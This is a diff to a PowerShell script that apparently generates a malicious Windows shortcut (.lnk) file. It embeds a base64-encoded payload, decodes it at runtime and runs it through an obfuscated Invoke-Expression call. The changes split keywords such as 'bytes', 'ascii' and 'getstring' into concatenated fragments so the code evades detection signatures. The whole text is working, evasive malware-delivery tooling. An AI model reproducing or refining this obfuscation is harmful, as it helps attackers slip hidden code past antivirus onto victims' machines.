@@ -14,7 +14,7 @@ $strings = @("assembly",'gettype','System.Text.Encoding','System.Convert','ascii
 
 #used to format after string obfuscation and fix formatting errors
 $start = "([string]::('n'+'ew')([char[]](('"
-$end = "'"+'|f`hx).bytes|%{$johnxor-'+"$offset})))"
+$end = "'"+'|f`hx).('+"'by'+'tes'"+')|%{$johnxor-'+"$offset})))"
 $fix = @'
 '+"'"+'
 '@
@@ -29,7 +29,7 @@ function hide{
 $strings = $strings|%{hide($_)}
 
 #decoded is [text.encoding]::ascii.getstring([type].assembly.gettype('System.Convert')::frombase64string(SomeBase64))|i`ex
-$final = ' [text.encoding]::ascii.getstring([type].'+$strings[0]+'.'+$strings[1]+'('+$strings[3]+')::'+$strings[6]+'('+$strings[7]+'))|i`ex'
+$final = ' [text.encoding]::('+"'asc'+'ii'"+").('gets'+'tring')([type]."+$strings[0]+'.'+$strings[1]+'('+$strings[3]+')::'+$strings[6]+'('+$strings[7]+'))|i`ex'
 
 #making the lnk
 $WshShell = New-Object -comObject WScript.Shell
